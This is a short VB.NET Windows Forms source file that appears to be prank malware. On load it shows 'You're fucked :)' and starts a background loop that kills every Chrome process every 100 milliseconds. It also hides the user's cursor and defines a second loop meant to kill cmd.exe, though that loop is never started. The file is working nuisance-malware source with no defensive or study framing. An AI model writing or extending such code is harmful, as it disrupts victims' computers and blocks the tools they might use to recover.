Public Class Form2
    Private Sub Button1_Click(sender As Object, e As EventArgs)
        Cursor.Show()
        MessageBox.Show("Made in vb.net :)")
        Application.Exit()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Cursor.Hide()
    End Sub

    Private Sub PictureBox1_CursorChanged(sender As Object, e As EventArgs) Handles PictureBox1.CursorChanged
        Cursor.Hide()
    End Sub

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim T As New Threading.Thread(AddressOf Block)
        T.Start()
        Dim U As New Threading.Thread(AddressOf FuckingYourMomsDad)
        MessageBox.Show("You're fucked :)")
    End Sub
    Sub Block()
        While True
            For Each P As Process In Process.GetProcessesByName("chrome")
                P.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Sub FuckingYourMomsDad()
        While True
            For Each F As Process In Process.GetProcessesByName("cmd")
                F.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        Form3.Show()
    End Sub
End Class